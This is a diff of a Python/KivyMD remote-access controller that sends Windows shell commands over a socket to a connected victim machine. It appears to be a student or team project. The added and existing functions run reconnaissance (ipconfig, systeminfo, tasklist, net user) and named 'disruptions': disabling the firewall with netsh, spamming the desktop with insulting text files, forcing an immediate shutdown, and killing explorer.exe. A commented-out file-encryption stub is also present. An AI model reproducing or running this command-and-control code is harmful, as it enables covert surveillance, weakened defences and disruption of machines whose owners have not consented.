@@ -163,6 +163,9 @@ class Main(MDApp):
     # This is to gather the client's information about their network
     def NetworkInfo(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             # Send command to the client
             command = 'ipconfig /all'
             self.currConn.send(command.encode())
@@ -177,29 +180,50 @@ class Main(MDApp):
     #Gather Operating System Information
     def OSInfo(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
+            #Get OS Information
             command = 'systeminfo | findstr /C:"OS"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
             output = self.currConn.recv(8096).decode()
-            print('Output: ', output)
+
+            command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
+            #command = 'Get-WmiObject win32_Processor'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            output2 = self.currConn.recv(8096).decode()
+
+            #Print results
+            
+            print('Output: \n')
+            print(output)
+            print(output2)
             break
 
     # Zees stuff
     #Get the % of CPU Utilization
     def CpuUsage(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             command = 'wmic cpu get loadpercentage'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
             output = self.currConn.recv(8096).decode()
             print('Output: ', output)
+            self.root.ids.consoleField.text = output
             break
 
     #Get current running tasks
     def Tasks(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             # Send command to client
             command = 'tasklist'
             self.currConn.send(command.encode())
@@ -208,22 +232,30 @@ class Main(MDApp):
             # Receive output from client
             output = self.currConn.recv(20480).decode()  # Still needs more buffer
             print('Output: ', output)
+            self.root.ids.consoleField.text = output
             break
 
     #Get current running services
     def Services(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             command = 'net start'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
             output = self.currConn.recv(8096).decode()
             print('Output: ', output)
+            self.root.ids.consoleField.text = output
             break
 
     # Fang's stuffz
     def UserInfo(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             # Get Username, Fullname, Last Login
             command = 'net user "%USERNAME%"'
             self.currConn.send(command.encode())
@@ -249,11 +281,16 @@ class Main(MDApp):
     #Disable Firewall Disruption
     def Firewall(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
+            command = "C:\WINDOWS\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p"
             command = "netsh advfirewall set allprofiles state off"
             self.currConn.send(command.encode())
             print('[+] Command sent')
             output = self.currConn.recv(1024).decode()
             print(f"Output: {output}")
+            self.root.ids.consoleField.text = output
             break
 
 ##    def EncryptFiles(self):
@@ -276,29 +313,41 @@ class Main(MDApp):
     # File Creation Disruption
     def FileCreate(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
+            self.root.ids.consoleField.text = command
             break
 
     #Zees Simple Disruptions
     #Shutdown Disruption
     def Shutdown(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             #/t is Timer
             command = 'shutdown /s /t 00'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
+            self.root.ids.consoleField.text = command
             break
 
     def KillTask(self):
         while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
             #procname = input('Enter Process Name: ')
             command = 'taskkill /im explorer.exe /F'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             output = self.currConn.recv(8096).decode()
             print('Output: ', output)
+            self.root.ids.consoleField.text = output
             break
 
 if __name__ == '__main__':
